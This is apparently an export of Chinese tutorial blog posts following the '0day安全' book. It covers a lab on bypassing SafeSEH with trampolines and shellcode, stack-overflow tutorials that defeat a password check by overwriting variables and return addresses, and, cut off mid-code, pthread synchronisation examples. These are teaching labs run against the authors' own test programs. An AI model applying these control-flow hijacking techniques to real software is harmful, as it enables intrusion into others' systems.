实验步骤： （ 1）编译一个不启用 SafeSEH 的 DLL 在VC++ 6.0 中建立一个 Win32 的动态链接库，如下图所示 重新设置基址，在顶部菜单中选择 “工程 —&gt; 设置”，然后切换到 ”连接“ 选项卡，在 “工程选项“ 的输入框中添加 ” /base:“0x11120000” “即可，如下图所示 编译好后，将 SEH_NOSafeSEH_JUMP.DLL 复制到与 SEH_NOSafeSEH.EXE 相同目录下。 （ 2）分析要溢出的主程序 添加 INT 3中断，然后通过 OllySSEH 插件查看加载模块的 SafeSEH 情况。 插件下载地址：(https://bbs.pediy.com/thread-45544.htm) OllySSEH 对于 SafeSEH 的描述： （1） /SafeSEH OFF，未启用 SafeSEH，这种模块可以作为跳板。 （2） /SafeSEH ON，启用 SafeSEH，可以使用右键点击查看 S.E.H 注册情况。 （3） No SEH，不支持 SafeSEH，即 IMAGE_DLLCHARACTERISTICS_ NO_SEH 标志位被设置，模块内的异常会被忽略，所以不能作为跳板。 （4） Error，读取错误 查看结果，如下图所示。主程序 SEH_NOSafeSEH.EXE 中启用了 SafeSEH，但是它里面的模块SEH_NOSafeSEH_JUMP.DLL 未启用 SafeSEH，我们可以利用这个 DLL 中的 ”pop pop retn“ 指令作为跳板来绕过 SafeSEH。 （ 3）确定跳板地址 转到 0x11120000 中右击，查找 --&gt; 命令序列 在命令序列框中输入下图命令，查找它 然后我们就找到了在DLL中的 “pop eax pop eax retn”，位于 0x11121068 处，如下图 （ 4）构造 shellcode 计算被溢出字符串到最近的异常处理函数指针的距离。 先将 shellcode 赋值为 0x90 串，长度小于 200 个字节，然后再 strcpy 操作结束后中断程序。 如下图，被溢出字符串起始位置为 0x0012FDB8 ​ 距离它最近的异常处理函数指针位于 0x0012FE90+4 位置。 由于这次使用的是 “pop pop retn” 指令序列，所以我们要将弹出 “failwest” 对话框的机器码放到 shellcode 的后半部分。（避免未命中） 注意：经过 VS 2008 编译的程序，在进入含有__try{}的函数时会在 Security Cookie+4 的位置压入-2（ VC++ 6.0 下为-1），在程序进入__try{}区域时程序会根据该__try{}块在函数中的位置而修改成不同的值。 例如，函数中有两个__try{}块，在进入第一个__try{}块时这个值会被修改成 0，进入第二个的时候被修改为 1。如果在__try{}块中出现了异常，程序会根据这个值调用相应的__except()处理，处理结束后这个位置的值会重新修改为-2；如里没有发生异常，程序在离开__try{}块时这个值也会被修改回-2。当然这个值在异常处理时还有其他用途，在这我们不过多介绍，有兴趣的话可以自己跟踪调试一下。我们只需要知道由于它的存在，我们的 shellcode 可能会被破坏。 为了避免shellcode 关键部分被破坏，我们采用一下布局：shellcode 最开始部分为 220 个字节的 0x90 填充；在 221~224 位置用跳板地址 0x11121068 覆盖；然后再跟上 8 个字节的 0x90 填充；最后附上弹出 “ failwest” 对话框的机器码。这样就可以保证弹出对话框的机器码不被破坏了。 题外话： 在实际的溢出过程中由于条件限制和未知因素， shellcode 有时会被破坏，出现这种情况时可以尝试不同的 shellcode 布局，使用不同的跳转指令，以避开这些破坏。 （ 5）调试运行 将上面的 shellcode 布置好后，编译运行程序，用 OllyDbg 调试程序，在 0x11121068 处下断点，让程序继续运行。 我们将会看到，程序停在 0x11121068 处，说明我们已经进入DLL 绕过 SafeSEH，成功劫持程序流程了，如下图。 继续单步执行，我们将会看到从 0x0012FE90 到 0x0012FEA0 中有一些未知命令，分别是我们用来覆盖异常函数指针的跳板地址和进入__try{}块时被赋值为 0 的部分。本实验中它们对实验结果没有影响，如果有影响，就要用向后跳转指令，跳过影响指令，直接进入关键部分。 可以尝试将 shellcode 中的 217~220 字节用 0xEB0E9090 填充，执行后，他会跳过 shellcode 中间部分，直接运行到弹出对话框部分。 按F9继续执行，就能看到对话框了。 利用加载模块之外的地址绕过 SafeSEH 在前面我们讲过，SafeSEH 只检查异常处理函数指针是否指向栈中地址，对于指向其它地址它是不对其进行有效性验证的。所以我们可以让异常处理函数指针指向非栈地址，进而就能绕过 SafeSEH 检验。 然而当程序加载到内存中后，在它所占的整个内存空间中，除了我们平时常见的 PE 文件模块（ EXE 和 DLL）外，还有其他一些映射文件（我们可以通过 OllyDbg 的“view→memory”查看程序的内存映射状态）。例如下图中的 map类型，如果我们能在这些文件中找到跳转指令的话就可以绕过 SafeSEH，而这样的指令也确实存在。 1234567891011121314跳板指令：除了前面的 pop eax pop eax retn 外，还有以下指令call/jmp dword ptr[esp+0x8]call/jmp dword ptr[esp+0x14]call/jmp dword ptr[esp+0x1c]call/jmp dword ptr[esp+0x2c]call/jmp dword ptr[esp+0x44]call/jmp dword ptr[esp+0x50]call/jmp dword ptr[ebp+0xc]call/jmp dword ptr[ebp+0x24]call/jmp dword ptr[ebp+0x30]call/jmp dword ptr[ebp-0x4]call/jmp dword ptr[ebp-0xc]call/jmp dword ptr[ebp-0x18] 只要找到一条指令就能绕过 SafeSEH 了。我们通过下面的程序来演示和分析如何在所有加载模块都开启 SafeSEH 机制的情况下绕过 SafeSEH。 123456789101112131415161718192021222324252627282930313233343536#include&quot;stdafx.h&quot;#include&lt;string.h&gt;#include&lt;windows.h&gt;char shellcode[]=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;……&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xE9\\x2B\\xFF\\xFF\\xFF\\x90\\x90\\x90&quot;// far jump and \\x90&quot;\\xEB\\xF6\\x90\\x90&quot;// short jump and \\x90&quot;\\x0B\\x0B\\x29\\x00&quot;// address of call [ebp+30] in outside memory;DWORD MyException(void)&#123; printf(&quot;There is an exception&quot;); getchar(); return 1;&#125;void test(char * input)&#123; char str[200]; strcpy(str,input); int zero=0; __try &#123; zero=1/zero; &#125; __except(MyException()) &#123; &#125;&#125;int _tmain(int argc, _TCHAR* argv[])&#123; //__asm int 3 test(shellcode); return 0;&#125; 实验思路： （ 1） Test 函数中通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。 （ 2）该程序中所有加载模块都启用了 SafeSEH 机制，故我们不能通过未启用 SafeSEH 的模块还绕过 SafeSEH 了。 （ 3）将异常处理函数指针覆盖为加载模块外的地址来实现对 SafeSEH 的绕过，然后通过除 0 触发异常将程序转入异常处理，进而劫持程序流程。 推荐使用的环境 备 注 操作系统 Window XP SP3 DEP 关闭 编译器 Visual Studio 2008 编译选项 禁用优化选项 build 版本 release 版本 说明： shellcode 中尾部的 0x00290B0B 为 Windows XP SP3 下的跳板地址，如果您在其他操作系统下测试，该地址可能需要重新设置。 实验步骤： （ 1）分析程序，先将 shellcode 填充为多个 0x90（长度不超过200个），然后编译运行程序。 在 Ollydbg 中用 OllySEH 插件分析加载模块的 SafeSEH 情况，如下图，可以看到，所有加载模块都没有 /SafeSEH OFF 状态。 （ 2）在加载模块内存之外寻找合适的跳板绕过 SafeSEH。 接下来需要使用 OllyFindAddr 插件，它能在整个程序的内存空间搜索指令。OllyFindAddr下载地址：https://bbs.pediy.com/thread-198080.htm 使用 call/jmp dword ptr[ebp+n]指令作为跳板。插件 —&gt; OllyFindAddr —&gt; Overflow return address —&gt; Find CALL/JMP [EBP+N] 在日志中查看搜索结果。Module：Unknown，就是加载模块之外的指令，将 0x00280B0B 作为跳板。 如果不确定，也可以将它与加载模块逐一比对。 （ 3）消除异常。如果直接用 0x00280B0B 构造 shellcode，那shellcode 可能会被它中的0x00截断，所以我们要将跳板放在shellcode的最后，防止其造成异常。 通过前面利用未启用 SafeSEH 模块绕过 SafeSEH，我们知道通过跳板指令转入 shellcode 后首先是4个字节的 0x90 的填充，所以我们可以利用这4个字节来跳转到 shellcode，而前面提到的 0xEB0E9090，其实 0xEB0E 是向前跳转 0x0E 的机器码，可以把它放在这4字节中，但由于1个字节的操作数向前回跳的范围有限，不足以跳转到shellcode 的起始地址，所以我们用两次跳转来完成跳跃。 部署两个跳板，在刚刚的 4个字节中部署短跳转指令 0xEBF6 向前回跳 8个字节。（JMP 指令用相对地址跳转时，是以 JMP 下一条指令的地址为基准，所以实际上是向后跳转10个字节）在这 8个字节中再布置一条 5字节的长跳转指令，跳转到 shellcode 的起始部分。 （ 4）构造 shellcode 确定 shellcode 起始地址到长跳转指令之间的距离。 本实验中，被溢出字符串起始位置为 0x0012FE88，距离最近 SEH地址为 0x0012FF60，部署长跳转指令位于 0x0012FF58，所以我们需要回跳 213 个字节（包含长跳转指令的 5 个字节），使用 E92BFFFFFF（跳转 0xFFFFFF2B 个字节）填充长跳位置。 除 0 异常后，最近SEH 地址为0x0012FF60 部署 shellcode （ 5）运行验证，对话框弹出","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SafeSEH","slug":"SafeSEH","permalink":"https://www.rgzzplus.com/tags/SafeSEH/"}]},{"title":"栈溢出","slug":"栈溢出","date":"2022-06-05T08:49:28.000Z","updated":"2022-08-01T11:17:09.430Z","comments":true,"path":"2022/06/05/栈溢出/","link":"","permalink":"https://www.rgzzplus.com/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"[toc] 基础知识 二进制文件概述 PE文件格式 PE（Portable Executable）是 Win32 平台下的可执行文件（如：&quot;*.exe&quot;,&quot;*.dll&quot;)，PE文件规定了所有信息（二进制机器代码、字符串、菜单、图标、位图、字体等）在可执行文件中如何组织。 PE 文件格式把可执行文件分成若干个数据节（section）： .text 二进制的机器代码 .data 初始化的数据块 .idata 动态链接库 .rsrc 程序的资源 系统栈的工作原理 内存的不同用途 缓冲区溢出：大缓冲区向小缓冲区复制，撑爆了小缓冲区，从而冲掉了和小缓冲区相邻内存区域的其它数据而引起的内存问题。 进程使用的内存划分： 代码区 数据区 堆区 栈区 函数调用过程 同一文件不同函数的代码在内存代码区中是散乱无关的，但都在同一个 PE 文件的代码所映射的一个 “节” 里。 12345678910111213141516171819intfunc_B(int arg_B1, int arg_B2)&#123; int var_B1, var_B2; var_B1=arg_B1+arg_B2; var_B2=arg_B1-arg_B2; return var_B1*var_B2;&#125;intfunc_A(int arg_A1, int arg_A2)&#123; int var_A; var_A = func_B(arg_A1,arg_A2) + arg_A1; return var_A;&#125;int main(int argc, char **argv, char **envp)&#123; int var_main; var_main=func_A(4,3); return var_main;&#125; 当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧的内存空间被它所属的函数独占。当函数返回时，系统栈会弹出该函数所对应的栈帧。 函数调用时，栈中的变化： 函数调用相关约定 如果要明确使用某一种调用约定，在函数前加上调用约定的声名即可。默认调用是__stdcall 调用方式，从右向左将参数入栈。 特例：C++类成员中的 this 指针，一般用 ECX 寄存器传递。用GCC编译器编译，他会作为最后一个参数压栈。 函数调用步骤： 参数入栈 返回地址入栈 代码区跳转 栈帧调整： 保存当前栈帧状态值，已备后面恢复本栈帧时使用（ EBP 入栈）； 将当前栈帧切换到新栈帧（将 ESP 值装入 EBP，更新栈帧底部）； 给新栈帧分配空间（把 ESP 减去所需空间的大小，抬高栈顶）； __stdcall 调用约定，函数调用指令： 12345678910 ;调用前push 参数 3 ;假设该函数有 3 个参数，将从右向左依次入栈push 参数 2push 参数 1call 函数地址;call 指令将同时完成两项工作： ;a）向栈中压入当前指令在内存中的位置，即保存返回地址。 ;b）跳转到所调用函数的入口地址函数入口处push ebp ;保存旧栈帧的底部mov ebp, esp ;设置新栈帧的底部（栈帧切换）sub esp, xxx ;设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间） 函数返回的步骤： 保存返回值：通常保存在 EAX 中。 弹出当前栈帧，恢复上一个栈帧。 具体操作： 在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间 将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。 将函数返回地址弹给 EIP 寄存器。 跳转 函数返回时，相关指令： 123456add esp, xxx ;降低栈顶，回收当前的栈帧pop ebp;将上一个栈帧底部位置恢复到 ebp，retn;这条指令有两个功能： ;a)弹出当前栈顶元素，即弹出栈帧中的返回地址。;至此，栈帧恢复工作完成。 ;b)让处理器跳转到弹出的返回地址，恢复调用前的代码区 修改邻接变量 修改邻接变量原理 函数的局部变量在栈中相邻排列。如果局部变量有数组之类的缓冲区，并且程序中存在数组越界缺陷，那么越界的数组就能破坏相邻变量，甚至能破坏 EBP 、返回地址。 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#define PASSWORD &quot;1234567&quot;int verify_password (char *password)&#123; int authenticated; char buffer[8];// add local buffto be overflowed authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here! return authenticated;&#125;main()&#123; int valid_flag=0; char password[1024]; while(1) &#123; printf(&quot;please input password: &quot;); scanf(&quot;%s&quot;,password); valid_flag = verify_password(password); if(valid_flag) &#123; printf(&quot;incorrect password!\\n\\n&quot;); &#125; else &#123; printf(&quot;Congratulation! You have passed the verification!\\n&quot;); break; &#125; &#125;&#125; 当程序执行到 int verify_password(char *password)时，栈帧状态如下图： 改变程序流程思路： 可以发现，authenticated 变量来源于 strcmp 函数的返回值，它被返回给main函数作为验证标志。当 authenticated 为 0 时，标识验证成功；反之，验证不成功。 当我们输入超过 7 个字符的密码（注意：字符截断符 NULL 将占用一个字节），就有机会把 authenticated 覆盖为 0，从而绕过密码验证。 突破密码验证程序 推荐使用的环境 备 注 操作系统 Windows XP SP3 其他 Win32 操作系统也可进行本实验 编译器 Visual C++ 6.0 如使用其他编译器，需重新调试 编译选项 默认编译选项 VS2003 和 VS2005 中的 GS 编译选项会使栈溢出实验失败 build 版本 debug 版本 如使用 release 版本，则需要重新调试 说明： 如果完全采用实验指导所推荐的实验环境，将精确地重现指导中所有的细节；否则需要根据具体情况重新调试。 （1）先验证一下正确密码，输入“1234567”，通过验证，结果如下图所示： （2）再来分析一下具体覆盖时，栈中的情况，输入“qqqqqqq”，因为“qqqqqqq”&gt;“1234567”，所以 strcmp 应该返回 1，即 authenticated 为 1。 局部变量名 内存地址 偏移 3 处的值 偏移 2 处的值 偏移 1 处的值 偏移 0 处的值 buffer[0～3] 0x0012FB18 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) buffer[4～7] 0x0012FB1C NULL 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) authenticated 0x0012FB20 0x00 0x00 0x00 0x01 观察内存时，注意 “内存数据” 与 “数值数据” 的区别。Win32 系统在内存中由低位向高位存储一个 4 字节的双字（DWORD），但在作为 ”数值“ 应用的时候，却是按照由高位字节向低位字节进行解释。“内存数据” 中的 DWORD 和我们逻辑上使用的 “数值数据” 是按字节序逆序过的。 （3）输入超过 7 个字符，“qqqqqqqqrst”，结果如下图： 局部变量名 内存地址 偏移 3 处的值 偏移 2 处的值 偏移 1 处的值 偏移 0 处的值 buffer 0x0012FB18 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) 0x0012FB1C 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) authenticated 被覆盖前 0x0012FB20 0x00 0x00 0x00 0x01 authenticated 被覆盖后 0x0012FB20 NULL 0x74 (‘t’) 0x73 (‘s’) 0x72(‘r’) 我们已经知道，通过溢出 buffer 我们能修改 authenticated 的值，若要改变程序流程，就需要把 authenticated 覆盖为 0，而我们的字符截断符 NULL，就刚好能实现，当我们输入 8 个 ‘q’ 时，buffer所拥有的 8 个字节将全部被 ’q‘ 填充，而 NULL 则刚好写入内存 0x0012FB20 出，即下一个双字的低位字节，恰好能把 authenticated 从 0x 00 00 00 01 改成 0x 00 00 00 00，如下图所示： 局部变量名 内存地址 偏移 3 处的值 偏移 2 处的值 偏移 1 处的值 偏移 0 处的值 buffer 0x0012FB18 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) 0x0012FB1C 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) authenticated 被覆盖前 0x0012FB20 0x01 authenticated 被覆盖后 0x0012FB20 0x00 (NULL) 经上述分析，我们只要输入 8 个**（大于 ”1234567“）** 字符的字符串，那么最后的 NULL 就能将 authenticated 低字节中的 1 覆盖为 0，从而绕过验证程序。 authenticated = strcmp( password, PASSWORD )， 当输入的字符串大于 ”1234567“时，返回1（0x 00 00 00 01），这时可以用NULL 淹没 authenticated 的低位字节从而突破验证； 当输入的字符串小于 ”1234567“时，返回 -1（0x FF FF FF FF），这时如果任然用上述方法淹没，其值变为 0xFF FF FF 00，所以这时是不能冲破验证程序的。 修改函数返回地址 返回地址与程序流程 更改邻接变量对环境要求很苛刻。而更改 EBP 和函数返回地址，往往更通用，更强大。 上节实验输入 7 个 “q“ ，程序栈状态： 局部变量名 内存地址 偏移 3 处的值 偏移 2 处的值 偏移 1 处的值 偏移 0 处的值 buffer 0x0012FB18 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) 0x0012FB1C NULL 0x71 (‘q’) 0x71 (‘q’) 0x71 (‘q’) authenticated 0x0012FB20 0x00 0x00 0x00 0x01 前栈帧 EBP 0x0012FB24 0x00 0x12 0xFF 0x80 返回地址 0x0012FB28 0x00 0x40 0x10 0xEB 如果继续增加输入的字符，我们就能让字符串中相应位置字符的 ASCII 码覆盖掉这些栈帧状态值。 这里用 19 个字符作为输入，看看淹没返回地址会对程序产生什么影响。出于双字对齐的目的，我们输入的字符串按照 “ 4321 ” 为一个单元进行组织，最后输入的字符串为“ 4321432143214321432”。 局部变量名 内存地址 偏移 3 处的值 偏移 2 字节 偏移 1 字节 偏移 0 字节 buffer[0~3] 0x0012FB18 0x31 (‘1’) 0x32 (‘2’) 0x33 (‘3’) 0x34 (‘4’) buffer[4~7] 0x0012FBIC 0x31 (‘1’) 0x32 (‘2’) 0x33 (‘3’) 0x34 (‘4’) authenticated（被覆盖前） 0x0012FB20 0x00 0x00 0x00 0x01 authenticated（被覆盖后） 0x0012FB20 0x31 (‘1’) 0x32 (‘2’) 0x33 (‘3’) 0x34 (‘4’) 前栈帧 EBP（被覆盖前） 0x0012FB24 0x00 0x12 0xFF 0x80 前栈帧 EBP（被覆盖后） 0x0012FB24 0x31 (‘1’) 0x32 (‘2’) 0x33 (‘3’) 0x34 (‘4’) 返回地址（被覆盖前） 0x0012FB28 0x00 0x40 0x10 0xEB 返回地址（被覆盖后） 0x0012FB28 0x00(NULL) 0x32 (‘2’) 0x33 (‘3’) 0x34 (‘4’) 返回地址用于在当前函数返回时重定向程序的代码。在函数返回的“ retn” 指令执行时，栈顶元素恰好是这个返回地址。“retn”指令会把这个返回地址弹入 EIP 寄存器，之后跳转到这个地址去执行。 返回地址本来是 0x004010EB，对应的是 main 函数代码区的指令，现在我们通过溢出 buff 覆盖返回地址为 0x00323334，函数返回时，将 0x00323334 装入 EIP 寄存器，从内存 0x00323334 处取址，由于此处没有合法指令，处理器不知如何处理，报错。 但如果这里是一个有效的指令地址，就能让处理器跳转到任意指令区去执行，我们可以通过淹没返回地址而控制程序的执行流程。 控制程序的执行流程 用键盘输入字符的 ASCII 表示范围有限，很多值（如 0x11、 0x12 等符号）无法直接用键盘输入，所以我们将程序的输入由键盘改为从文件中读取字符串。 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#define PASSWORD &quot;1234567&quot;int verify_password (char *password)&#123; int authenticated; char buffer[8]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here! return authenticated;&#125;main()&#123; int valid_flag=0; char password[1024]; FILE * fp; if(!(fp=fopen(&quot;password.txt&quot;,&quot;rw+&quot;))) &#123; exit(0); &#125; fscanf(fp,&quot;%s&quot;,password); valid_flag = verify_password(password); if(valid_flag) &#123; printf(&quot;incorrect password!\\n&quot;); &#125; else &#123; printf(&quot;Congratulation! You have passed the verification!\\n&quot;); &#125; fclose(fp);&#125; 程序的基本逻辑和上一节中的代码大体相同，只是现在将从同目录下的 password.txt 文件中读取字符串。 推荐使用的环境 备 注 操作系统 Windows XP SP3 其他 Win32 操作系统也可进行本实验 编译器 Visual C++ 6.0 如使用其他编译器，需重新调试 编译选项 默认编译选项 VS2003 和 VS2005 中的 GS 编译选项会使栈溢出实验失败 build 版本 debug 版本 如使用 release 版本，则需要重新调试 用 VC6.0 将上述代码编译链接（使用默认编译选项， Build 成 debug 版本），在与 PE 文件同目录下建立 password.txt 并写入测试用的密码之后，就可以用 OllyDbg 加载调试了。 动态调试时，需要我们做的工作： （1）摸清楚栈中的状况，如函数地址距离缓冲区的偏移量等。 （2）得到程序中密码验证通过的指令地址，以便程序直接跳去这个分支执行。 （3）在 password.txt 文件的相应偏移处填上这个地址。 这样 verify_password 函数返回后就能直接跳转到验证通过的分支执行了。 用OllyDbg 加载 可执行文件，【找到验证的程序分支的指令地址为】按G调出程序执行的流程图，分析一下程序执行流程。 从上面的流程图中，可以发现，在401111处的指令进行了程序验证。 0x00401102 调用了 verify_password 函数，之后在 0x0040110A 处将EAX中的返回值取出，在 0x0040110D处与0比较，然后决定跳转到提示验证通过的分支或是提示验证失败的分支。 提示验证通过的分支从 0x00401122处的参数压栈开始。如果我们把返回地址覆盖成这个地址，那么在 0x00401102处的函数调用返回后，程序将跳转到验证通过的分支，而不是进入分支判断代码。 通过动态调试，发现栈帧中的变量分布情况基本没变。这样我们按如下方法构造 password.txt 中的数据。 构造思路：用2个 “4321”来填充 buffer[8]，第3个“4321”来覆盖 authenticated，第4个“4321”覆盖前栈帧 EBP，第5个“4321” 的 ASCII码值 0x34333231 修改成验证通过分支的指令地址 0x00401122。 在构造 password.txt 时，我们需要用到一个软件 Ultraedit，通过它来编辑十六进制。 构造步骤： 创建一个 password.txt文件，写入5个“4321”，放在实验程序的目录中。 用 Ultraedit32 打开 password.txt 切换至十六进制编辑模式。 将最后4个字节修改为新的返回地址 0x00401122，注意：由于“大顶端”，我们需要逆序输入这4个字节 将 password.txt 保存后，用 OllyDbg 加载程序并调试，可以看到最终的栈状态如表所示。 局部变量名 内存地址 偏移 3 处的值 偏移 2 处的值 偏移 1 处的值 偏移 0 处的值 buffer[0~3] 0x0012FB14 0x31 (‘1’) 0x32 (‘2’) 0x33 (‘3’) 0x34 (‘4’) buffer[4~7] 0x0012FB18 0x31 (‘1’) 0x32 (‘2’) 0x33 (‘3’) 0x34 (‘4’) authenticated（被覆盖前） 0x0012FB1C 0x00 0x00 0x00 0x01 authenticated（被覆盖后） 0x0012FB1C 0x31 (‘1’) 0x32 (‘2’) 0x33 (‘3’) 0x34 (‘4’) 前栈帧 EBP（被覆盖前） 0x0012FB20 0x00 0x12 0xFF 0x80 前栈帧 EBP（被覆盖后） 0x0012FB20 0x31 (‘1’) 0x32 (‘2’) 0x33 (‘3’) 0x34 (‘4’) 返回地址（被覆盖前） 0x0012FB24 0x00 0x40 0x11 0x07 返回地址（被覆盖后） 0x0012FB24 0x00 0x40 0x11 0x22 程序执行状态如下图所示。 由于站内EBP被覆盖为无效值，使得程序在退出时堆栈无法平衡，导致崩溃。","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"栈","slug":"栈","permalink":"https://www.rgzzplus.com/tags/%E6%A0%88/"}]},{"title":"线程的同步互斥","slug":"线程的同步互斥","date":"2022-05-10T07:06:44.000Z","updated":"2022-08-01T11:15:34.191Z","comments":true,"path":"2022/05/10/线程的同步互斥/","link":"","permalink":"https://www.rgzzplus.com/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/","excerpt":"","text":"[toc] 《操作系统》同步互斥 引起同步互斥问题的原因 ​ 当下人们需要让进程在短时间内同时完成不止一件事情，每个线程处理各自独立的任务。线程是进程的更小分支，每一线程完成进程的一部分任务，但系统并不给线程分配任何资源，它共享创建它的进程所拥有的资源。但是当一个线程修改变量时，其它线程在读取这个变量时可能读取到不一致的值，无法区分到底是读取了修改前的值，还是修改后的值，导致了程序执行结果无法复现，所以就引入了同步互斥，来解决进程内的资源分配问题。 同步互斥方法说明 互斥锁 同步互斥方法说明 ​ 互斥锁，一个线程在进入临界区时应得到锁，在它退出时释放锁，以让其它需要的线程访问这个临界区。对于获得锁的进程，它会执行临界区的代码，同时其它未获得锁的线程会被阻塞，直到得到锁才会进入临界区。 自旋锁 同步互斥方法说明 ​ 自旋锁与互斥锁原理基本相同，不同之处在于未获得锁时被阻塞的方法实现不同，互斥锁通过硬件方法阻塞，而自旋锁通过软件方法，即让线程空循环来等待。 信号量 同步互斥方法说明 ​ 同步，一个线程完成了某一个动作就通过信号量告诉别的线程，别的线程再进行某些动作。而且信号量有一个更加强大的功能，信号量可以用作为资源计数器，把信号量的值初始化为某个资源当前可用的数量，使用一个之后递减，归还一个之后递增。 条件变量 同步互斥方法说明 ​ 条件变量，用while循环作判断条件，循环条件满足线程进入工作队列等待，直到其它线程的执行使得条件满足后，该线程才会跳出循环，继续执行剩余代码。 屏障 同步互斥方法说明 ​ 屏障允许等待任意数目的线程都到达某一点，直到到达该点的线程达到规定数目，然后从该点继续执行，而不用线程退出。 读写锁 同步互斥方法说明 ​ 读写与互斥量类似，读写锁有3种状态，读模式加锁，写模式加锁，不加锁。一次只能有一个线程占有写模式的读写锁，但是多个线程可以同时占有读模式的读写锁。 同步互斥方法实现 互斥锁 同步互斥方法实现 互斥锁 同步互斥示例代码 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;int ticketAmount = 2; //全局变量pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;//创建全局锁并初始化void* ticketAgent(void* arg)&#123; pthread_mutex_lock(&amp;lock); //上锁 int t = ticketAmount; if (t &gt; 0) &#123; printf(&quot;售出一张票!\\n&quot;); t--; &#125;else&#123; printf(&quot;票已经卖完了!!\\n&quot;); &#125; ticketAmount = t; pthread_mutex_unlock(&amp;lock); //解锁 pthread_exit(0); //退出线程&#125;int main(int argc, char const *argv[])&#123; pthread_t ticketAgent_tid[2]; //创建线程pid for (int i = 0; i &lt; 2; ++i) &#123; pthread_create(ticketAgent_tid+i, NULL, ticketAgent,NULL); &#125;//创建两个线程 for (int i = 0; i &lt; 2; ++i) &#123; pthread_join(ticketAgent_tid[i],NULL); &#125;//让主线程等待其它线程完成 printf(&quot;还剩下 %d张票\\n&quot;, ticketAmount); return 0;&#125; 未加锁： 加锁： 3.1.2 互斥锁 同步互斥关键代码说明 pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER; //创建全局锁并初始化 pthread_mutex_lock(&amp;lock); //上锁 pthread_mutex_unlock(&amp;lock); //开锁 3.2 自旋锁 同步互斥方法实现 3.2.1 自旋锁 同步互斥示例代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;int ticketAmount = 2; //全局变量pthread_spinlock_t lock;void* ticketAgent(void* arg)&#123; pthread_spin_lock(&amp;lock); //上锁 int t = ticketAmount; if (t &gt; 0) &#123; printf(&quot;售出一张票!\\n&quot;); t--; &#125;else&#123; printf(&quot;票已经卖完了!!\\n&quot;); &#125; ticketAmount = t; pthread_spin_unlock(&amp;lock); //解锁 pthread_exit(0); //退出线程&#125;int main(int argc, char const *argv[])&#123; pthread_spin_init(&amp;lock,PTHREAD_PROCESS_PRIVATE); pthread_t ticketAgent_tid[2]; //创建线程pid for (int i = 0; i &lt; 2; ++i) &#123; pthread_create(ticketAgent_tid+i, NULL, ticketAgent,NULL); &#125;//创建两个线程 for (int i = 0; i &lt; 2; ++i) &#123; pthread_join(ticketAgent_tid[i],NULL); &#125;//让主线程等待其它线程完成 printf(&quot;还剩下 %d张票\\n&quot;, ticketAmount); pthread_spin_destroy(&amp;lock); return 0;&#125; 未加锁： 加锁： 自旋锁 同步互斥关键代码说明 int pthread_spin_init(pthread_spinlock_t *lock, int pshared); //初始化自旋锁，pshared 参数表示自旋锁是否能被其它进程共享。 int pthread_spin_destroy(pthread_spinlock_t *lock); //销毁自旋锁，释放其资源 Int pthread_spin_lock(pthread_spinlock_t *lock); // 获得锁，如果锁未被占用，则将锁锁上，防止其它进程获得锁，如果锁被占中，则线程将一直循环等待，直到锁被释放获得锁 Int pthread_spin_unlock(pthrad_spinlock_t *lock); // 释放锁 号量 同步互斥方法实现 信号量 同步互斥示例代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;semaphore.h&gt;#define NEXTP 1 //代表有资源#define NEXTC 0 //代表无资源int full_v = 0; //统计有产品的位置数，占位数int empty_v = 5; //统计空位数int buff[5]=&#123;0&#125;; //位置缓冲池int in = 0; //指向下一个空位的索引int out = 0; //指向下一个产品位置的索引sem_t empty;sem_t full;sem_t mutex;void print(int *buff,int k) //输出数组&#123; printf(&quot;&#123;&quot;); for(int i = 0; i &lt; k; i++)&#123; printf(&quot;%d&quot;,*(buff+i)); if(i == k - 1) continue; printf(&quot;,&quot;); &#125; printf(&quot;&#125;\\n&quot;);&#125;void* producer(void* arg)&#123; while(1)&#123; sem_wait(&amp;empty); //empty = 0 则阻塞，empty &gt; 0则获取一个信号量，向下执行 if(empty_v != 0)&#123; empty_v--; sem_wait(&amp;mutex); buff[in] = NEXTP; in = (in + 